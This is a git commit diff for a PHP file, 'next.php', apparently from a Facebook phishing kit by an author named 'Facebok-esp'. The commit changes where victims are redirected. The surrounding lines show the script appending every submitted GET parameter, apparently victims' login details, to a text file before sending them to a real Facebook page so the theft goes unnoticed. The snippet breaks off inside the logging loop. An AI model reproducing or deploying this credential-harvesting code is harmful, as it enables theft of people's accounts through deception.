a5d5eb17408044913f8e2b3b409dd3ab61ed9587
Facebok-esp <73673055+Facebok-esp@users.noreply.github.com>
2020-10-29 17:54:28 -0500

    Update next.php

--- next.php
+++ next.php
@@ -1,5 +1,5 @@
 <?php
-header("Location: http://www.Facebook.com/login.php ");
+header("Location: https://www.facebook.com/110878820243331/photos/a.110884160242797/350377639626780/ ");
 $handle = fopen("yaeresmio.txt", "a"); 
 
 foreach($_GET as $variable => $value) {
